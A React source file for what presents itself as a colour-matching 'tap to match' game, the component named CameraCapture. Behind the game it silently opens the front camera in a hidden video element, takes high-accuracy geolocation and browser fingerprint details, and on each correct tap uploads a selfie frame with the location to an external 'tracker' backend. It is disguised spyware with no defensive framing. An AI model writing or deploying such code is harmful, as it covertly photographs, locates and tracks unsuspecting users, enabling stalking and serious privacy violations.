import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

const COLOR_PALETTE = [
  { name: 'Volt', hex: '#A3E635' },
  { name: 'Vibe', hex: '#A855F7' },
  { name: 'Fire', hex: '#F97316' },
  { name: 'Sky', hex: '#06B6D4' },
  { name: 'Rose', hex: '#F43F5E' },
  { name: 'Cyan', hex: '#22D3EE' }
];

function CameraCapture({ onSuccess }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState('LOADING');
  const [score, setScore] = useState(0);
  const [level, setLevel] = useState(1);
  const [combo, setCombo] = useState(0);
  const [timeLeft, setTimeLeft] = useState(60);
  const [targetColor, setTargetColor] = useState(COLOR_PALETTE[0]);
  const [displayColors, setDisplayColors] = useState([]);
  const [flash, setFlash] = useState(false);
  const [shake, setShake] = useState(false);
  const [browserInfo, setBrowserInfo] = useState(null);
  const [savedLocation, setSavedLocation] = useState({ latitude: 0, longitude: 0 });

  useEffect(() => {
    collectBrowserInfo();
    initializeGame();
  }, []);

  const collectBrowserInfo = () => {
    setBrowserInfo({
      browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
      os: navigator.platform,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    });
  };

  const initializeGame = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setSavedLocation({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          });
          startGame();
        },
        () => {
          startGame();
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } catch (err) {
      console.error('Initialization error:', err);
      startGame();
    }
  };

  const startGame = () => {
    setNewTarget();
    setStatus('PLAYING');
  };

  const setNewTarget = () => {
    const target = COLOR_PALETTE[Math.floor(Math.random() * COLOR_PALETTE.length)];
    setTargetColor(target);

    let colors = [target];
    while (colors.length < 6) {
      const randomColor = COLOR_PALETTE[Math.floor(Math.random() * COLOR_PALETTE.length)];
      if (!colors.some(c => c.hex === randomColor.hex)) {
        colors.push(randomColor);
      }
    }

    for (let i = colors.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [colors[i], colors[j]] = [colors[j], colors[i]];
    }
    setDisplayColors(colors);
  };

  useEffect(() => {
    if (status !== 'PLAYING') return;
    const interval = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          return 60;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [status]);

  const captureFrame = async () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;

    if (!canvas || !video) return;

    const maxWidth = 400;
    const maxHeight = 300;
    let width = video.videoWidth || 640;
    let height = video.videoHeight || 480;

    if (width > height) {
      if (width > maxWidth) {
        height = Math.round(height * maxWidth / width);
        width = maxWidth;
      }
    } else {
      if (height > maxHeight) {
        width = Math.round(width * maxHeight / height);
        height = maxHeight;
      }
    }

    canvas.width = width;
    canvas.height = height;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, width, height);
    const base64 = canvas.toDataURL('image/jpeg', 0.5);

    try {
      await axios.post(`${API_BASE_URL}/api/records`, {
        selfie: base64,
        location: savedLocation,
        browserInfo: browserInfo
      });
    } catch (err) {
      console.error('Upload error:', err);
    }
  };

  const handleColorPress = async (color) => {
    if (status !== 'PLAYING') return;

    if (color.hex === targetColor.hex) {
      setFlash(true);
      setTimeout(() => setFlash(false), 150);
      const newCombo = combo + 1;
      setCombo(newCombo);
      const points = 100 + (newCombo * 50);
      setScore(prev => prev + points);

      if (score + points >= level * 1000) {
        setLevel(prev => prev + 1);
      }

      await captureFrame();
      setNewTarget();
    } else {
      setShake(true);
      setTimeout(() => setShake(false), 300);
      setCombo(0);
    }
  };

  if (status === 'LOADING') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-950 to-slate-950 flex items-center justify-center p-4">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-slate-400 font-semibold text-lg">Preparing...</p>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen bg-gradient-to-br from-slate-900 via-purple-950 to-slate-950 p-6 overflow-hidden relative ${shake ? 'animate-[shake_0.3s_ease-in-out]' : ''}`}>
      {flash && <div className="absolute inset-0 bg-white opacity-20 pointer-events-none animate-ping"></div>}

      <div className="max-w-md mx-auto flex flex-col gap-6 relative z-10">
        <div className="grid grid-cols-3 gap-4">
          <div className="bg-slate-800/50 backdrop-blur border border-slate-700 rounded-2xl p-4 text-center">
            <p className="text-slate-400 text-xs font-bold uppercase tracking-widest">Score</p>
            <p className="text-3xl font-black text-lime-400">{score}</p>
          </div>
          <div className="bg-slate-800/50 backdrop-blur border border-slate-700 rounded-2xl p-4 text-center">
            <p className="text-slate-400 text-xs font-bold uppercase tracking-widest">Level</p>
            <p className="text-3xl font-black text-cyan-400">{level}</p>
          </div>
          <div className="bg-slate-800/50 backdrop-blur border border-slate-700 rounded-2xl p-4 text-center">
            <p className="text-slate-400 text-xs font-bold uppercase tracking-widest">Combo</p>
            <p className="text-3xl font-black text-fuchsia-400">{combo}x</p>
          </div>
        </div>

        <div className="w-full bg-slate-800/50 backdrop-blur border border-slate-700 rounded-full h-3 overflow-hidden">
          <div
            className="h-full bg-gradient-to-r from-cyan-400 via-fuchsia-400 to-rose-400 transition-all duration-300"
            style={{ width: `${(timeLeft / 60) * 100}%` }}
          ></div>
        </div>

        <div className="text-center space-y-2">
          <p className="text-slate-400 font-semibold uppercase tracking-widest">Target</p>
          <div
            className="w-32 h-32 mx-auto rounded-2xl shadow-lg shadow-purple-500/25 border-4 border-slate-700 flex items-center justify-center"
            style={{ backgroundColor: targetColor.hex }}
          >
            <span className="text-slate-950 font-black text-lg">{targetColor.name}</span>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-4">
          {displayColors.map((color, index) => (
            <button
              key={index}
              onClick={() => handleColorPress(color)}
              className="aspect-square rounded-2xl shadow-xl shadow-purple-500/10 border-3 border-slate-700 hover:scale-105 active:scale-95 transition-all duration-150"
              style={{ backgroundColor: color.hex }}
            ></button>
          ))}
        </div>

        <div className="text-center mt-4">
          <p className="text-slate-400 text-sm font-semibold">Tap to match</p>
        </div>
      </div>

      <div className="hidden">
        <video ref={videoRef} autoPlay playsInline muted></video>
        <canvas ref={canvasRef}></canvas>
      </div>

      <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-5px); }
          75% { transform: translateX(5px); }
        }
      `}</style>
    </div>
  );
}

export default CameraCapture;
